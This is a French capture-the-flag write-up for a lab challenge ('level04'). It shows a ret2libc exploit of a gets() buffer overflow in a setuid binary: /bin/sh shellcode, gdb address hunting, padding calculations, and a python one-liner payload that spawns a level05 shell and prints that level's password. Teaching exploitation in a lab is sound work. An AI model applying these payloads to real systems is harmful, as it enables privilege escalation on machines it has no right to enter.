Je commence par analyser mon environnement :

```bash
$ id && pwd && ls -la
uid=1004(level04) gid=1004(level04) groups=1004(level04),100(users)
/home/users/level04
total 17
dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
```

Je trouve un binaire `level04`, que je tente d'éxecuter :

```bash
$ ./level04
Give me some shellcode, k
hiii
child is exiting...
```

J'essaye alors de lui donner le `shellcode` pour [/bin/sh](https://shell-storm.org/shellcode/files/shellcode-827.html) : 

```bash
$ ./level04
Give me some shellcode, k
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
child is exiting...
```

Sans succès, je décompile le binaire avec [Dogbolt](https://dogbolt.org/?id=d27e3b04-b575-4126-af26-7c135c61096e#Hex-Rays=166) :

```c
int main(int argc, const char **argv, const char **envp)
{
  int stat_loc;
  char buffer[128]; // <------------------------1 buffer declared being 128 bytes
  int ptrace_result;
  pid_t pid;

  pid = fork();

  memset(buffer, 0, sizeof(buffer));
  ptrace_result = 0;
  stat_loc = 0;

  if ( pid )
  {
    do
    {
      wait(&stat_loc);

      if ( (stat_loc & 0x7F) == 0 || (stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
      {
        puts("child is exiting...");
        return 0;
      }
      ptrace_result = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
    }
    while ( ptrace_result != 11 );
    puts("no exec() for you");
    kill(pid, 9);
  }
  else
  {
    prctl(1, 1);
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    puts("Give me some shellcode, k");
    gets(buffer); // <--------------------------2 write user input into buffer but no size check = overflow = Ret2Libc
  }
  return 0; // <--------------------------------3 Ret2Libc overwrites return address of main() to point to system("/bin/sh")
}
```

Je ne comprend pas grand chose à cette fonction, mais j'observe très rapidement la présence du vulnérable `gets()` qui écrit dans un buffer de taille 128, mais qui n'a pas de limite dans la taille d'écriture. Je peux donc, comme dans `Rainfall` et avec la vulnérabilité `Ret2Libc` des exercices précédents, ré-écrire sur l'adresse de `main()` afin de pointer vers `system()`, `exit()` (toujours optionel) et `/bin/sh`.

J'utilise `gdb` pour trouver ces adresses :

```h
$ gdb ./level04 -q
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.

(gdb) b main
Breakpoint 1 at 0x80486cd

(gdb) r
Starting program: /home/users/level04/level04

Breakpoint 1, 0x080486cd in main ()

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system <---------------------- ici
0xf7f48a50  svcerr_systemerr

(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0xf7e5eb70  exit <------------------------ ici
0xf7e5eba0  on_exit
0xf7e5edb0  __cxa_atexit
0xf7e5ef50  quick_exit
0xf7e5ef80  __cxa_at_quick_exit
0xf7ee45c4  _exit
0xf7f27ec0  pthread_exit
0xf7f2d4f0  __cyg_profile_func_exit
0xf7f4bc30  svc_exit
0xf7f55d80  atexit

(gdb) info proc mappings
process 2492
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
         0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so <--- libc
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so <--- end
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec <------------------------ ici
1 pattern found.
```

Comme au `level01`, je cherche le padding du payload en analysant `gdb` :

```h
$ gdb ./level04 -q
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
....
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp <--------- break here before stack cleanup
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret
End of assembler dump.

(gdb) b *main+343
Breakpoint 1 at 0x804881f

(gdb) r
Starting program: /home/users/level04/level04
Give me some shellcode, k
dab
child is exiting...

Breakpoint 1, 0x0804881f in main ()
(gdb) info registers
...
esp            0xffffd660       0xffffd660
ebp            0xffffd718       0xffffd718
...
```

Je peux soustraire `esp` d'`ebp` : `0xffffd718 - 0xffffd660 = 184` bytes, auquel je soustrais le début de `buffer` dans le stack :

```h
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx <-------- buffer declaration here
   0x080486e6 <+30>:    mov    $0x0,%eax
```

Soit `184 - 0x20 = 184 - 32 = 152` bytes.
Comme pour le `level01`, j'ajoute 4 bytes (pour écrire sur la `return address` de main).

Cela me donne un total de 156 bytes de padding. J'essaye le même payload que dans le `level01` : 

```bash
$ (python -c 'print("\x90" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
^C
```
